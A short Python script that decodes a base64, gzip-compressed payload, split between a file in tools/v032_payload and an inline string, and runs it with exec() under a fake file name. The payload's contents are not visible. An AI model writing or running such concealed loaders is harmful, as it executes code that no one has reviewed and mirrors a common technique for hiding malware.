from pathlib import Path
import base64
import gzip

root = Path(__file__).resolve().parents[1]
payload_dir = root / "tools" / "v032_payload"
part0 = (payload_dir / "part00.b64").read_text(encoding="utf-8").strip()
part1 = (
    "cZNKkfnJ6V7NgMRSr3qQjTaTuNoHj9Cai2Rb9QR/egU0aiplgFZWBMEHeDEc9qKL+7C6gwKeG28hxBul05UhuSJG2je/4Ex3ZfWxuwhTHC7d26Myw1u6M3UoKw59+QI6H9aIu5+F0WNR1S7VV5vibSXcsblbwWbt8PpXm64Myuo/jLLfCeYm7x6oWMn4KhQ/vmbjBRqxKGyitp0W+w6CwtbuazUgCitKjLr3coaKS9dxBN1ppBfV6XIaWPBjihkw3Ln0rVBEHRTr4cAKYnH8xF4EM32tzSZHGO8SRYc81gRN03VEeqc1vp1QfJQIxtMzvqmKEqqdWj0LYgYXrIyc3h5jX1VcXsqojsTZyUipaQXRL736ASgQLjQrcVFSqzfJ0SnUvJP3Cf54kGp6dIaKuvgODUrHoFOUvrKQtlG+iFDWEZVvLiyNhTbVULArmIht4/V4MMDd/vGAndL7Exk9Hk8v0GsdgPsVv+qNskX4JgbMEAWYEZ57eHtDWtDoZVYp5uyLBdngRbu1d+8A5OC2L0hM8EX2uxrVTe8irNf+D4Dqr7PuUgAA"
)
source = gzip.decompress(base64.b64decode(part0 + part1)).decode("utf-8")
runtime_path = root / "tools" / "apply_v032_runtime.py"
namespace = {"__name__": "__main__", "__file__": str(runtime_path)}
exec(compile(source, str(runtime_path), "exec"), namespace)
